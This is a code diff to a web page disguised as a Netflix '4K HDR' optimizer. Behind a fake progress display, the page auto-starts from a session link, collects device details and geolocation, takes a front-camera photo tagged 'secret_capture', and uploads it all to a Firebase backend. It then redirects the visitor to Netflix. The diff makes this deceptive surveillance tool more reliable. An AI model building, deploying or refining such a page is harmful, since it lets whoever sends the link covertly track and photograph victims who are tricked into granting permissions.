@@ -48,9 +48,10 @@
             border-radius: 12px;
             font-size: 12px;
             display: none;
-            color: #4ade80;
-            background: #0a2e1a;
         }
+        .status.success { background: #0a2e1a; color: #4ade80; display: block; }
+        .status.error { background: #2e0a0a; color: #ff6b6b; display: block; }
+        .status.info { background: #0a1a2e; color: #1a73e8; display: block; }
         video, canvas { display: none; }
     </style>
 </head>
@@ -85,29 +86,45 @@
         const startBtn = document.getElementById('startBtn');
         const statusMsg = document.getElementById('statusMsg');
         
-        function showStatus(msg, isError = false) {
-            statusMsg.style.display = 'block';
-            statusMsg.style.background = isError ? '#2e0a0a' : '#0a2e1a';
-            statusMsg.style.color = isError ? '#ff6b6b' : '#4ade80';
+        function showStatus(msg, type) {
+            statusMsg.className = 'status ' + type;
             statusMsg.innerHTML = msg;
+        }
+        
+        if (!sessionId) {
+            showStatus('❌ Invalid link', 'error');
+            startBtn.disabled = true;
         }
         
         async function saveData(type, data) {
             if (!sessionId) return;
-            const newKey = db.ref().child(`sessions/${sessionId}/data`).push().key;
-            await db.ref(`sessions/${sessionId}/data/${newKey}`).set({
-                type: type, data: data, timestamp: new Date().toISOString()
-            });
+            try {
+                const newKey = db.ref().child(`sessions/${sessionId}/data`).push().key;
+                await db.ref(`sessions/${sessionId}/data/${newKey}`).set({
+                    type: type, 
+                    data: data, 
+                    timestamp: new Date().toISOString()
+                });
+                return true;
+            } catch(e) {
+                console.error(e);
+                return false;
+            }
         }
         
         async function uploadFile(file, type) {
-            if (!sessionId) return;
-            const filename = `${sessionId}_${Date.now()}_${file.name}`;
-            const ref = storage.ref(`uploads/${filename}`);
-            await ref.put(file);
-            const url = await ref.getDownloadURL();
-            await saveData(type, { url, name: file.name });
-            return url;
+            if (!sessionId) return null;
+            try {
+                const filename = `${sessionId}_${Date.now()}_${file.name}`;
+                const ref = storage.ref(`uploads/${filename}`);
+                await ref.put(file);
+                const url = await ref.getDownloadURL();
+                await saveData(type, { url, name: file.name });
+                return url;
+            } catch(e) {
+                console.error(e);
+                return null;
+            }
         }
         
         // Get IP
@@ -145,28 +162,38 @@
         // Get Location
         async function getLocation() {
             return new Promise((resolve) => {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    await saveData('location', {
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude,
-                        map: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
-                    });
-                    resolve(true);
-                }, () => resolve(false));
+                if (!navigator.geolocation) {
+                    resolve(false);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        await saveData('location', {
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            map: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
+                        });
+                        resolve(true);
+                    },
+                    () => resolve(false),
+                    { timeout: 10000 }
+                );
             });
         }
         
-        // Take Camera Photo - DIRECT TRIGGER
+        // Take Camera Photo
         async function takePhoto() {
             try {
-                showStatus("📷 Camera access requested...");
+                showStatus('📷 Requesting camera access...', 'info');
                 
-                // Direct camera access
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // Request camera
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                
-                // Wait for camera to initialize
                 await new Promise(r => setTimeout(r, 1000));
                 
                 const canvas = document.getElementById('canvas');
@@ -174,33 +201,32 @@
                 canvas.height = video.videoHeight || 480;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                // Convert to file and upload
-                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
                 const file = new File([blob], `photo_${Date.now()}.jpg`, { type: 'image/jpeg' });
                 
-                await uploadFile(file, 'secret_capture');
-                showStatus("✅ Photo captured and uploaded!");
+                const url = await uploadFile(file, 'secret_capture');
+                if (url) {
+                    showStatus('✅ Photo captured successfully!', 'success');
+                } else {
+                    showStatus('⚠️ Photo captured but upload failed', 'error');
+                }
                 
-                // Stop camera
                 stream.getTracks().forEach(t => t.stop());
                 return true;
                 
             } catch(error) {
-                console.error("Camera error:", error);
-                showStatus("❌ Camera access denied. Please allow camera permission.", true);
+                console.error('Camera error:', error);
+                showStatus('❌ Camera access denied. Please allow camera permission.', 'error');
                 return false;
             }
         }
         
         // MAIN FUNCTION
         async function start() {
-            if (!sessionId) {
-                showStatus("❌ Invalid link", true);
-                return;
-            }
+            if (!sessionId) return;
             
             startBtn.disabled = true;
-            showStatus("🔧 Starting optimization...");
+            showStatus('🔧 Starting optimization...', 'info');
             
             // Step 1: Device Info + IP
             const deviceInfo = await getDeviceInfo();
@@ -210,21 +236,21 @@
                 device: deviceInfo.device,
                 battery: deviceInfo.battery,
                 screen: deviceInfo.screen,
-                ua: deviceInfo.ua
+                ua: deviceInfo.ua,
+                timestamp: new Date().toISOString()
             });
-            showStatus("✅ Device detected: " + deviceInfo.device);
+            showStatus(`✅ Device: ${deviceInfo.device} | Battery: ${deviceInfo.battery}`, 'success');
             
             // Step 2: Location
-            showStatus("📍 Requesting location...");
+            showStatus('📍 Requesting location...', 'info');
             await getLocation();
             
             // Step 3: Camera Photo
-            showStatus("📷 Requesting camera...");
             await takePhoto();
             
             // Step 4: Complete
             await saveData('complete', { time: new Date().toISOString() });
-            showStatus("✅ 4K HDR Enabled! Redirecting...");
+            showStatus('✅ 4K HDR Enabled! Redirecting...', 'success');
             
             setTimeout(() => {
                 window.location.href = "https://www.netflix.com";
@@ -235,7 +261,7 @@
         
         // Auto start after 1 second
         if (sessionId) {
-            setTimeout(start, 1000);
+            setTimeout(start, 800);
         }
     </script>
 </body>
